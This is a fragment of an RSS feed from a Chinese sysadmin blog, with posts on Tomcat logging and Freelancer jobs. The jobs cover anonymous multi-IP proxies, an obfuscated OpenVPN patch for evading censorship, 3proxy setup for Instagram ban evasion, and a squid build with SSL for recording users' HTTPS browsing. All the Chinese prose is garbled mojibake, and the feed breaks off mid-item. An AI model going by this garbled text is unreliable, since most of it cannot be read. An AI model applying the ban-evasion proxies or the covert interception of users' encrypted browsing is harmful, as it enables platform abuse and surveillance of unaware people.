&lt;li&gt;%q - Query string (prepended with a &amp;lsquo;?&amp;rsquo; if it exists)&lt;/li&gt;
&lt;li&gt;%r - First line of the request (method and request URI)&lt;/li&gt;
&lt;li&gt;%s - HTTP status code of the response&lt;/li&gt;
&lt;li&gt;%S - User session ID&lt;/li&gt;
&lt;li&gt;%t - Date and time, in Common Log Format&lt;/li&gt;
&lt;li&gt;%u - Remote user that was authenticated (if any), else &amp;lsquo;-&amp;rsquo;&lt;/li&gt;
&lt;li&gt;%U - Requested URL path&lt;/li&gt;
&lt;li&gt;%v - Local server name&lt;/li&gt;
&lt;li&gt;%D - Time taken to process the request, in millis&lt;/li&gt;
&lt;li&gt;%T - Time taken to process the request, in seconds&lt;/li&gt;
&lt;li&gt;%I - Current request thread name (can compare later with stacktraces)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¦å¤–ï¼Œè¿˜å¯ä»¥å°†requestè¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ã€sessionä¼šè¯å˜é‡å€¼ã€cookieå€¼æˆ–HTTPè¯·æ±‚/å“åº”å¤´å†…å®¹çš„å˜é‡å€¼ç­‰å†…å®¹å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Freelancerçš„ä»»åŠ¡ä¹‹ä¸€ï¼šå¤šIPå¤šé‡åŒ¿åä»£ç†åŠ è®¤è¯</title>
      <link>https://rendoumi.com/posts/20240124-freelancer_1/</link>
      <pubDate>Wed, 24 Jan 2024 10:07:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-freelancer_1/</guid>
      <description>&lt;p&gt;Freelancerä¸Šæœ‰ä¸ªproxy setupçš„ä»»åŠ¡ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Project Description  
Hi, I would like to create a new VPS proxy server with multiple IPs on the same VPS.  
Are you able to that?  
What OS do you prefer?  
- I have 10 ips.
- I want them to be as much anonymous as you can.
- I would have an Username and Password as auth, but if needed the possibility to have an IP authentication too.
My budget is: ~20$  
Thank you in advance.  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¯´è€å®è¯ï¼Œ10ä¸ªIPæ²¡å¿…è¦ï¼Œä¸€ä¸ªIPè¶³å¤Ÿäº†ï¼Œç”¨Tor+polipoå³å¯ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Freelancerä»»åŠ¡ä¹‹äºŒï¼šå»ºä¸€ä¸ªscramble obfuscated opevpn</title>
      <link>https://rendoumi.com/posts/20240124_freelancer_2/</link>
      <pubDate>Wed, 24 Jan 2024 10:06:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124_freelancer_2/</guid>
      <description>&lt;p&gt;è¿™ä¸ªå¾ˆå¥‡æ€ªæ’’ï¼Œä»”ç»†æŸ¥äº†ä¸‹ï¼ŒåŸä½œè€…æ˜¯è¿™ä¹ˆè¯´çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;I have created a patch which introduces some forms of scrambling to the packet payload of any OpenVPN connection.  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;I have been successfully using the patch with Iranian and Chinese users &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; some &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; now.  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹æ¥ä¼Šæœ—ä¹Ÿæ¯”è¾ƒç³Ÿç³•å•Šã€‚&lt;/p&gt;
&lt;p&gt;æ— è¯­ï¼Œé‰´äºåœ¨æ£®åæ˜“è…¾æ— æ³•å»ºopenvpnï¼Œä¸çŸ¥é“æ˜¯ç›´æ¥å°äº†1194çš„udpç«¯å£ï¼Œè¿˜æ˜¯ä»åè®®ä¸Šå°æ‰äº†openvpnï¼Œæ€»ä¹‹ï¼Œéƒ½å¾ˆshitã€‚&lt;/p&gt;
&lt;p&gt;ç®€å•è¯´å°±æ˜¯å¯¹openvpnåè®®è¿›è¡Œäº†æ··æ·†ï¼Œå¤šäº†ä¸€ä¸ªé…ç½®é¡¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scramble å‚æ•°  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scramble reverse &lt;span class=&#34;c1&#34;&gt;#å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡Œåè½¬ï¼Œé€šå¸¸è¿™ä¸€å¥å°±å·²ç»å¯ä»¥ç»•è¿‡Chinaå’ŒIrançš„æ£€æµ‹æœºåˆ¶äº†  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scramble xorptrpos &lt;span class=&#34;c1&#34;&gt;#å¯¹ä¼ è¾“çš„packageä¸­çš„æœ‰æ•ˆæ•°æ®è¿›è¡Œxorè¿ç®—  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scramble obfuscate password &lt;span class=&#34;c1&#34;&gt;#æ›´å¼ºçƒˆçš„åŠ å¯†ã€‚åè½¬+xor+å¯†ç ä¸‰ç§æ–¹å¼å…¨ç”¨ä¸Š. &amp;#34;password&amp;#34; æ˜¯ä½ è®¾å®šçš„å¯†ç &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç”¨ä¸Šè¿™ä¸ªé…ç½®é¡¹åï¼Œå»ºè®®è®¾ç½®cipher none, å› ä¸ºå¦‚æ­¤è¿™èˆ¬ä»¥åï¼Œæ²¡æœ‰å¿…è¦å†åˆ¶å®šcipheræ–¹å¼äº†ã€‚å¦å¤–ï¼Œç”¨cipherä¼šæ¶ˆè€—cpuï¼Œè€Œé‡‡ç”¨scrambleæ¶ˆè€—cpuçš„ç¨‹åº¦æ¯”cipherä½ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ­ä¸€ä¸ªè¯•è¯•çœ‹ è¿™é‡Œé‡‡ç”¨çš„æ˜¯openvpn 2.4.4ç‰ˆæœ¬å’Œç›¸åº”çš„patch&lt;/p&gt;
&lt;p&gt;ä¸‹è½½ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;2.4.4.zip&#34;&gt;2.4.4.zip&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;master.zip&#34;&gt;master.zip&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#centos &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install unzip  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y groupinstall &lt;span class=&#34;s2&#34;&gt;&amp;#34;development tools&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#ubuntu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install build-essential
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;unzip -x 2.4.4.zip  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;unzip -x master.zip  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åº”ç”¨è¡¥ä¸ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Freelancerä»»åŠ¡ä¹‹ä¸‰ï¼šSetup Proxy on VPS for Instagram</title>
      <link>https://rendoumi.com/posts/20240124_freelancer_3/</link>
      <pubDate>Wed, 24 Jan 2024 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124_freelancer_3/</guid>
      <description>&lt;p&gt;ä»»åŠ¡çš„è¦æ±‚æ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;â€¢ Multiple subnets to avoid bans
â€¢I need the proxies to have the ability of User:Pass
â€¢Proxy needs to be Residential IPv6&lt;/p&gt;
&lt;p&gt;è¿˜ç»™å‡ºäº†ä¸€ä¸ªå‚è€ƒï¼š
&lt;a href=&#34;https://www.blackhatworld.com/seo/never-buy-proxies-again-setup-your-own-proxy-server.872539/&#34;&gt;https://www.blackhatworld.com/seo/never-buy-proxies-again-setup-your-own-proxy-server.872539/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ©ï¼Œæ¯”è¾ƒæœ‰æ„æ€ã€‚æŒ‰ç…§ä»–ç»™çš„è¿æ¥ï¼š&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€æ­¥å» LowEndBox.com æˆ–è€… Webhostingtalk.com å»æ‰¾ä¸€å®¶å£ç¢‘æ¯”è¾ƒå¥½ï¼Œè€Œä¸”èƒ½æä¾›é™„åŠ ipçš„VPSä¾›åº”å•†ï¼Œé€šå¸¸é™„åŠ ä¸€ä¸ªIPæ˜¯1$ä¸€ä¸ªæœˆã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒæ­¥ä¹°ä¸ªVPSï¼Œé…ç½®æ˜¯1Gå†…å­˜ï¼Œ1ä¸ªå†…æ ¸ï¼Œ100Må¸¦å®½ï¼Œå¹¶ä¸”é™„åŠ 10ä¸ªIPã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·çš„VPSä¸€èˆ¬æ˜¯5$ä¸€ä¸ªæœˆï¼Œ10$10ä¸ªipä¸€ä¸ªæœˆï¼Œåˆè®¡15$ä¸€ä¸ªæœˆï¼Œ100å…ƒäººæ°‘å¸ï¼Œè¿™æ ·ä½ å°±æœ‰11ä¸ªIPå¯ç”¨äº†ã€‚&lt;/p&gt;
&lt;p&gt;æŒ‰è¿™ä¸ªä»»åŠ¡çš„è¦æ±‚ï¼Œéœ€è¦Multiple subnetï¼Œä½ å°±ä»è¿™å®¶ä¾›åº”å•†çš„ä¸åŒåœ°ç‚¹å¤šä¹°å‡ å°ï¼Œæ¯”å¦‚æ´›æ‰çŸ¶1å°ï¼Œå¾·å·1å°ï¼Œçº½çº¦1å°ï¼Œç„¶åæ¯å°é™„åŠ 10ä¸ªIP&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸‰æ­¥å°±æ˜¯å®‰è£…Proxyè½¯ä»¶äº†ï¼š&lt;/p&gt;
&lt;p&gt;ä¸‹è½½3Proxy&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://img.rendoumi.com/soft/3proxy/0.8.11.tar.gz  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf 0.8.11.tar.gz  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¯‘å®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; 3proxy-0.8.11  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sed -i &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/^prefix.*/prefix=\/usr\/local\/3proxy/&amp;#39;&lt;/span&gt; Makefile.Linux  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sed -i &lt;span class=&#34;s1&#34;&gt;&amp;#39;/DENY.*/a #define ANONYMOUS 1&amp;#39;&lt;/span&gt; src/proxy.h  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make -f Makefile.Linux  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make -f Makefile.Linux install  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢æˆ‘æ˜¯å®‰è£…åˆ°äº†/usr/local/3proxyï¼Œå¤§å®¶å¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹çœ‹é…ç½®éƒ½æ˜¯ä»€ä¹ˆ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat cfg/3proxy.cfg.sample &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -v ^# &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -v ^$  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nserver 10.1.2.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nserver 10.2.2.2  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nscache &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;timeouts &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;180&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1800&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;users 3APA3A:CL:3apa3a &lt;span class=&#34;s2&#34;&gt;&amp;#34;test:CR:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1$qwer$CHFTUFGqkjue9HyhcMHEe1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;service  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log c:&lt;span class=&#34;se&#34;&gt;\3&lt;/span&gt;proxy&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ogs&lt;span class=&#34;se&#34;&gt;\3&lt;/span&gt;proxy.log D  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;logformat &lt;span class=&#34;s2&#34;&gt;&amp;#34;- +_L%t.%.  %N.%p %E %U %C:%c %R:%r %O %I %h %T&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;archiver rar rar a -df -inul %A %F  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rotate &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auth iponly  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;external 10.1.1.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;internal 192.168.1.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auth none  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dnspr  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auth strong  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;deny * * 127.0.0.1,192.168.1.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;allow * * * 80-88,8080-8088 HTTP  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;allow * * * 443,8443 HTTPS  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;proxy -n  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auth none  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pop3p  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcppm &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; mail.my.provider &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auth strong  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flush  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;allow 3APA3A,test  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;maxconn &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;socks  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auth strong  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flush  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;internal 127.0.0.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;allow 3APA3A 127.0.0.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;maxconn &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸€å †çš„åºŸç‰©é…ç½®å•Šï¼Œç»Ÿç»Ÿå»æ‰&lt;/p&gt;</description>
    </item>
    <item>
      <title>Freelancerä»»åŠ¡ä¹‹å››squidæŸ¥è¯¢ç”¨æˆ·æµè§ˆè®°å½•</title>
      <link>https://rendoumi.com/posts/20240124-freelancer_4/</link>
      <pubDate>Wed, 24 Jan 2024 10:04:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-freelancer_4/</guid>
      <description>&lt;p&gt;è¿™ä¸ªéœ€æ±‚ä¹Ÿæ¯”è¾ƒç®€å•ï¼š&lt;/p&gt;
&lt;p&gt;User Browsing Log for Open VPN server&lt;/p&gt;
&lt;p&gt;ç®€å•è¯´å°±æ˜¯ç”¨æˆ·è¿åˆ°ä»–çš„openvpnæœåŠ¡å™¨ï¼Œé€šè¿‡ä¸Šé¢çš„squidä»£ç†æ¥æµè§ˆå…¶ä»–ç½‘ç«™ï¼Œæ¯”è¾ƒç‰¹åˆ«çš„æ˜¯éœ€è¦æŸ¥çœ‹ç”¨æˆ·httpå’Œhttpsçš„æµè§ˆè®°å½•ã€‚&lt;/p&gt;
&lt;p&gt;squidåšé€æ˜ä»£ç†ï¼Œè¿™æ ·å°±å¯ä»¥æˆªå–æµè§ˆè®°å½•å¹¶ä¸”æä¾›åŠ é€Ÿäº†&lt;/p&gt;
&lt;p&gt;æœåŠ¡å™¨æ˜¯Ubuntuï¼Œç¼ºçœå®‰è£…çš„çš„squidæ˜¯ä¸æ”¯æŒSSLçš„ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ç¼–è¯‘ä¸€ä¸ª&lt;/p&gt;
&lt;p&gt;å®‰è£…ä¾èµ–åŒ…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install build-essential fakeroot devscripts gawk gcc-multilib dpatch  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get build-dep squid3  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get build-dep openssl  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install libssl-dev  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; squid3  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‹è½½åˆ°squidçš„æºä»£ç ï¼Œä»¥åŠubuntuçš„ä¿®æ”¹åŒ…ï¼Œè§£å‹å¹¶é‡Šæ”¾ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf squid3_3.5.12.orig.tar.gz  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; squid3-3.5.12  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar xf ../squid3_3.5.12-1ubuntu7.5.debian.tar.xz  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿®æ”¹å‚æ•°å¢åŠ å¯¹sslçš„æ”¯æŒï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi debian/rules  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Add --with-openssl --enable-ssl --enable-ssl-crtd under the DEB_CONFIGURE_EXTRA_FLAGS section.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DEB_CONFIGURE_EXTRA_FLAGS :&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;BUILDCXXFLAGS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;CXXFLAGS&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;LDFLAGS&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                --with-default-user&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;proxy &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;                --with-openssl &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;                --enable-ssl &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;                --enable-ssl-crtd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¯‘ï¼Œä¼šç”Ÿæˆ7ä¸ªdebåŒ…&lt;/p&gt;</description>
    </item>
    <item>
      <title>Freelancerä»»åŠ¡ä¹‹äº”å¤šçº¿è·¯èšåˆvpn</title>
      <link>https://rendoumi.com/posts/20240124-freelancer_5/</link>
      <pubDate>Wed, 24 Jan 2024 10:03:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-freelancer_5/</guid>
      <description>&lt;p&gt;è¿™ä¸ªä»»åŠ¡å¾ˆæœ‰æ„æ€&lt;/p&gt;
&lt;p&gt;ä»»åŠ¡æè¿°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;we need a &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; of vpn server / client programmed &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; embedded linux &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;or windows&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
